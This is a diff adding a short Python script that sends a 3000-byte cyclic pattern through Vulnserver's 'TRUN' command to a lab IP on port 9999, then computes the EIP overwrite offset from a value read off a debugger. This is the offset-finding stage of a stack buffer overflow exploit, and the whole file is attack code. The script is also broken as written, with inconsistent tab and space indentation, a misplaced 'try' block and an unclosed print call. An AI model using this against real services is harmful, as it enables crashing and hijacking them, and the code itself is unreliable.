@@ -1,0 +1,33 @@
+import socket
+from pwn import cyclic, cyclic_find
+
+
+#Target details
+target_IP = "192.168.1.135"
+port = 9999
+pattern_length = 3000
+
+def send_payload(payload_bytes):
+ try:
+		print("connecting to taget...")
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect ((target_IP, port))
+		s.send (b"TRUN /.:/" + payload_bytes)
+		print("Payload sent.")
+		s.close()
+ except Exception as e:	
+		print("Connection failed:", e)
+
+pattern = cyclic(pattern_length)
+send_payload(pattern)
+		
+eip_input = input("[?] Enter EIP value from debugger (hex, e.g., 0x39654138): ").strip()
+ try:    
+        eip_val = int(eip_input, 16)
+		offset = cyclic_find(eip_val)    
+		print(f"[*] Calculated offset: {offset}"
+ except ValueError:    
+	    print("[!] Invalid input. Enter a hex number like 0x39654138.")
+		
+		
+		
